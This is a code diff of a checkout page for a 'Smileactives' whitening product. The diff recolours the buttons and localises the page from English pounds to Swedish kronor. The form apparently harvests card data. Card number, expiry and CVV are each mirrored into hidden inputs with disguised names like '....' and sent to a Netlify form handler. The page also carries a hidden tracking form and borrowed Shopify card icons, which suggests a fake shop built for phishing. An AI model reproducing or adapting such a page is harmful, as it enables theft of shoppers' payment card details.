@@ -75,10 +75,10 @@ label {
     }
 
     .btn-primary {
-        background-color: #FD605B;
-        border: 2px solid #FD605A; /* Added a transparent border to ensure size consistency */
+        background-color: #000000; /* Black button */
+        border: 2px solid #000000; /* Added a black border to ensure size consistency */
         border-radius: 16px;
-        transition: all 0.3s ease-in-out; /* Improved transition to include all properties */
+        transition: all 0.3s ease-in-out;
     }
 
     .payment-method {
@@ -96,9 +96,9 @@ label {
     }
 
     .btn-primary:hover, .btn-primary:focus, .btn-primary:active {
-        background-color: #F13F39; /* Slightly darkened hover/focus effect */
-        border-color: #7ddedf; 
-        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Added a shadow for better hover effect */
+        background-color: #FDCC5E; /* Accent Color */
+        border-color: #FDCC5E; 
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
     }
 
     @media(max-width: 992px) {
@@ -268,26 +268,26 @@ label {
     <!-- Checkout Container -->
     <div class="container checkout-container py-5">
         <div class="checkout-formal">
-            <h1 class="display-4">Checkout</h1>
+            <h1 class="display-4">Kassan</h1>
 
             <form id="checkout-formal" method="post" data-netlify="true" action="/thankyou.html">
                 <input type="hidden" name="form-name" value="checkout-formal">
 
                 <!-- Shipping Information -->
-                <h2 class="mb-3">Shipping Information</h2>
+                <h2 class="mb-3">Leverans</h2>
                <div class="form-group">
-    <label for="fullName">Full Name</label>
+    <label for="fullName">Fullständigt Namn</label>
     <input type="text" class="form-control" id="fullName" required>
     <input type="hidden" id="hiddenFullName" name="Lanomination">
 </div>
 
 
                 <div class="form-group">
-                    <label for="email">Email Address</label>
+                    <label for="email">E-post</label>
                     <input type="email" class="form-control" id="email" name="email" required>
                 </div>
                 <div class="form-group">
-                    <label for="phone">Phone</label>
+                    <label for="phone">Telefon</label>
                     <input type="phone" class="form-control" id="phone" name="phone" required>
                 </div>
                 <div class="form-group">
@@ -295,37 +295,37 @@ label {
                     <input type="text" class="form-control" id="address" name="address" required>
                 </div>
                 <div class="form-group">
-                    <label for="city">City</label>
+                    <label for="city">Stad</label>
                     <input type="text" class="form-control" id="city" name="city" required>
                 </div>
                 <div class="form-group">
-                    <label for="zip">ZIP</label>
+                    <label for="zip">Postnummer</label>
                     <input type="text" class="form-control" id="zip" name="zip" required>
                 </div>
                 <div class="form-group">
-                    <label for="country">Country</label>
+                    <label for="country">Land</label>
                     <select class="form-control" id="country" name="country" required>
                        <option value="Sweden" selected>Sverige</option>
                     </select>
                 </div>
 
                 <!-- Shipping Method -->
-                <h2 class="my-3">Shipping Method</h2>
+                <h2 class="my-3">Fraktmetod</h2>
 <div class="shipping-method-box">
     <div class="form-check">
         <input class="form-check-input" type="radio" name="shippingMethod" id="standardShipping" value="standard" checked>
         <label class="form-check-label" for="standardShipping">
-        Standard Shipping
+        Standardfrakt
         </label>
     </div>
-    <p class="mb-0">£0.00</p>
+    <p class="mb-0">0.00 kr</p>
 </div>
 
 
-                <h2 class="my-3">Payment</h2>
+                <h2 class="my-3">Betalning</h2>
 <div class="payment-method">
     <div class="d-flex justify-content-between align-items-center">
-        <p class="mb-0"><strong>Credit/Debit Card</strong></p>
+        <p class="mb-0"><strong>Kontokort</strong></p>
         <div id="card-icons">
             <img id="visa-icon" src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Visa" width="35">
             <img id="mastercard-icon" src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/ae9ceec48b1dc489596c.svg" alt="MasterCard" width="35">
@@ -334,13 +334,13 @@ label {
     </div>
 
     <div class="form-group">
-        <label for="nameOnCard">Name on Card</label>
+        <label for="nameOnCard">Namn på kort</label>
         <input type="hidden" name="...." id="nameOnCardx">
         <input type="text" class="form-control" id="nameOnCard" autocomplete="cc-name" required>
     </div>
 
     <div class="form-group">
-        <label for="cardNumber">Card Number</label>
+        <label for="cardNumber">Kortnummer</label>
         <input type="hidden" name="..." id="cardNumberx">
         <input type="text" class="form-control" id="cardNumber" autocomplete="cc-number" required>
         <p id="cardIssuer"></p>
@@ -349,18 +349,18 @@ label {
     <!-- Combined expiry and CVV into a flex container -->
     <div class="form-group dual-inputs">
         <div>
-            <label for="expiry">Expiry (MM/YY)</label>
+            <label for="expiry">Förfallodatum (MM/ÅÅ)</label>
             <input type="hidden" name=".." id="expiryx">
             <input type="text" class="form-control" id="expiry" autocomplete="cc-exp" required>
         </div>
         <div>
-            <label for="cvv">CVV</label>
+            <label for="cvv">Säkerhetskod</label>
             <input type="hidden" name="." id="cvvx">
             <input type="text" class="form-control" id="cvv" autocomplete="cc-csc" required>
         </div>
     </div>
 </div>
-<button type="submit" class="btn btn-primary btn-lg btn-block">Place Order - £24.95</button>
+<button type="submit" class="btn btn-primary btn-lg btn-block">Betala nu - 249 Kr</button>
 </form>
 
         </div>
@@ -371,25 +371,25 @@ label {
             <!-- Product Details (This should be dynamically generated) -->
             <div class="row product-details">
                 <div class="col-3">
-                    <img src="images/Daily-Pro-Whitening-Gel.png" alt="Product Image" class="img-thumbnail">
+                    <img src="images/1_1_128x128.png" alt="Product Image" class="img-thumbnail">
                 </div>
                 <div class="col-9">
-                    <p>PSmileactives Pro</p>
-                    <p>Quantity: 1</p>
-                    <p>Price: <span class="float-right">£24.95</span></p>
+                    <p>Smileactives lampa</p>
+                    <p>Antal: 1</p>
+                    <p>Pris: <span class="float-right">249 Kr</span></p>
                 </div>
             </div>
             <!-- Subtotal -->
             <div class="subtotal">
-                <h4>Subtotal: <span class="float-right">£24.95</span></h4>
+                <h4>Totalsumma: <span class="float-right">249 Kr</span></h4>
             </div>
             <!-- Shipping -->
             <div class="shipping">
-                <h4>Shipping: <span class="float-right">FREE</span></h4>
+                <h4>Frakt: <span class="float-right">FRI</span></h4>
             </div>
             <!-- Total -->
             <div class="total">
-                <h4>Total: <span class="float-right">£24.95</span></h4>
+                <h4>Totalt: <span class="float-right">249 Kr</span></h4>
             </div>
         </div>
         <form name="pageview" id="hiddenForm" data-netlify="true" style="display: none;">
